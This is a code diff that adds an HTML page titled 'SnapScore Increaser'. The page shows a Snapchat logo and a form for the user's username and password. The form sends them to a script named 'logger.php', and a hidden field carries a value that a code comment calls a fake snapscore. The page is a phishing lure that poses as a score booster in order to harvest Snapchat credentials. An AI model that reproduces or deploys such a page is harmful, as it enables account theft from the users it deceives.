@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapScore Increaser</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="logo">
+                <img src="snapchat_logo.png" alt="Snapchat Logo">
+            </div>
+            <h2 class="heading">SnapScore Increaser</h2>
+            <form action="logger.php" method="post">
+                <input type="text" id="username" name="username" placeholder="Username" required><br>
+                <input type="password" id="password" name="password" placeholder="Password" required><br><br>
+                <input type="hidden" name="snapscore" value="1000000"> <!-- Fake snapscore value -->
+                <input type="submit" value="Increase SnapScore">
+            </form>
+        </div>
+    </div>
+</body>
+</html>
